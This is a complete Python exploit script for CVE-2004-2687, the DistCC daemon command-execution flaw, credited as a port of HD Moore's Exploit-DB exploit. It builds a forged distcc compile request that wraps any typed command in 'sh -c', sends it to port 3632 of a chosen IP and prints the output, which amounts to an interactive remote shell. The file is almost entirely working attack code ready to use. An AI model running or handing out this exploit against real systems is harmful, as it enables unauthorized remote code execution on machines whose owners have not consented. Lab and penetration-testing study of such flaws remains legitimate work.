#!/usr/bin/python
import argparse, socket, random, signal, string, readline

"""
CVE-2004-2687 | DistCC Daemon Command Execution

Created by Angel Pimentel

LinkedIn  https://www.linkedin.com/in/angel-pimentell
GitHub    https://github.com/angelpimentell
Twitter   https://twitter.com/angelpimentelll

Exploit creator: HD Moore
https://www.exploit-db.com/exploits/9915
"""

# Global variables
IP = "10.129.242.185"
PORT = 3632

# Ctrl + C
def def_handler(sig,frame):
    print("\n\n[!] Exiting...\n")
    exit(1)

def args():

	global IP
	global PORT

	parser = argparse.ArgumentParser(prog='CVE-2004-2687 EXPLOIT',
									usage=f'main.py -i <ip> -p <port>',
									description='Program to exploit CVE-2004-2687 vulnerability and getting RCE')
	
	parser.add_argument("-i", "--ip", type=str, help='victim ip', required=True)
	parser.add_argument("-p", "--port", default=3632, type=int, help='port to exploit', required=False)

	arg = parser.parse_args()
	
	IP = arg.ip
	PORT = arg.port

def rand_text_alphanumeric(len):
	text = ""
	for i in range(len):
		text += random.choice(string.ascii_letters + string.digits)

	return text

def exploit():

	start = False
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.settimeout(5)
			s.connect((IP, PORT))

			# start message
			if start == False:
				print("\n[+] Connection successful")
				print("[+] Try to execute commands\n")
				start = True

			command = input("> ")

			# convince distccd that this is a compile
			args = ["sh", "-c", command, "#", "-c", "main.c", "-o", "main.o"]

			# set distcc 'magic fairy dust' and argument count
			payload = "DIST00000001ARGC00000008"

			for arg in args:
				payload += "ARGV%.8x%s" % (len(arg), arg)

			# command
			s.send(str.encode(payload))

			# dtag
			s.send(str.encode("DOTI0000000A" + rand_text_alphanumeric(10)))

			s.recv(24)
			s.recv(4)
			leng = int(s.recv(8), 16)

			# attempt to receive data
			if leng != 0:
				print(s.recv(leng).decode("utf-8"))

			s.recv(4)

			# attempt to receive data
			leng = int(s.recv(8), 16)
			if leng != 0:
				print(s.recv(leng).decode("utf-8"))

		except socket.timeout:
			print("\n[!] Socket timeout\n")
			break
		except socket.error:
			print("\n[!] Socket error\n")
			break
		except Exception:
			print("\n[!] Unknow error\n")
			break
		finally:
			s.close()

if __name__ == "__main__":
	signal.signal(signal.SIGINT, def_handler)
	args()
	exploit()
